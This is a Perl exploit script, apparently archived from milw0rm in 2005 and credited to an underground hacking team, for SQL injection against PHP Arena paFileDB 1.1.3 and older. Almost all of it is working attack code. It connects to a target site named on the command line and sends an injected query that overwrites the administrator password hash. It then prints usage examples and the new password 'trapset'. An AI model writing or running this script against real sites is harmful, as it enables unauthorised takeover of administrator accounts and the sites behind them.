#!/usr/bin/perl
######################################################################################
#        T r a p - S e t   U n d e r g r o u n d   H a c k i n g   T e a m           #
######################################################################################
#  EXPLOIT FOR:   PHP Arena paFileDB 1.1.3 And 0lder                                 #
#                                                                                    #
#Expl0it By: A l p h a _ P r o g r a m m e r (Sirus-v)                               #
#Email: Alpha_Programmer@LinuxMail.ORG                                               #
#                                                                                    #
#                                                                                    #
# + Discovered By: GulfTech                                                          #
# + Advisory: http://www.securityfocus.com/bid/13967                                 #
#Vulnerable:   PHP Arena paFileDB 1.1.3 and Older                                    #
######################################################################################
# GR33tz T0 ==>     mh_p0rtal  --  oil_Karchack  --  Dr_CephaleX  -- Str0ke          #
#And Iranian Security & Hacking Groups:                                              #
#                                                                                    #
#      Crouz ,  Simorgh-ev   , IHSsecurity , AlphaST , Shabgard &  Emperor           #
######################################################################################

use IO::Socket;
if (@ARGV < 2)
{
  print "\n====================================================\n";
  print " \n       PHPArena Exploit By Alpha Programmer\n\n";
  print "       Trap-Set Underground Hacking Team      \n\n";
  print "           Usage: <T4rg3t> <DIR>\n\n";
  print "====================================================\n\n";
  print "Examples:\n\n";
  print "    xpl.pl www.Site.com / \n";
  exit();
}

my $host = $ARGV[0];
my $dir = $ARGV[1];
my $remote = IO::Socket::INET->new ( Proto => "tcp", PeerAddr => $host,
PeerPort => "80" );
unless ($remote) { die "C4nn0t C0nn3ct to $host" }
print "\n\n[+] C0nn3cted\n";
$http = "pafiledb.php?action=team&tm=file&file=edit&id=1&edit=do&query=UPDATE%20pafiledb_admin%20SET%20admin_password%20=%20c15c493548d09ffd03c9d41d8bbbfeef%281337%28%20WHERE%201/*\n";
$http .= "Host: $host\n\r\n\r";
print "[+] Injecting SQL Commands ...\n";
sleep(1);
print "[+] Changing Admin's Password ...\n";
print $remote $http;
sleep(1);
while (<$remote>)
{
}
print "[+] Now , Login With This Password :\n";
print "Password : trapset\n\n";
print "Enjoy ;) \n\n";

# milw0rm.com [2005-06-15]
